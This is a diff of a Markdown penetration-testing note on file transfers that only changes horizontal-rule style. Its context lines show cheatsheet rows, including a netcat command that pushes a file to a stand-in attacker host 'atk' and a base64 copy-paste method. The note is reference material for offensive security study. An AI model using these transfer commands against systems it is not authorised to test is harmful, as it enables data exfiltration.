@@ -24,7 +24,7 @@ linked:
 ---
 # File Transfers
 
-***
+---
 
 ## Cheatsheet
 ^file-transfers
@@ -43,7 +43,7 @@ linked:
 | **netcat** | `nc -lvnp 4444 > f` \| `nc atk 4444 < f` |
 | **base64 paste** | `base64 f; ...paste...; base64 -d > f` |
 
-***
+---
 
 ## Concepto
 
@@ -309,4 +309,4 @@ Archivos útiles para drop:
 - [GTFOBins](https://gtfobins.github.io/) — Linux equivalent.
 - [PayloadsAllTheThings - File Transfers](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md)
 
-***
+---
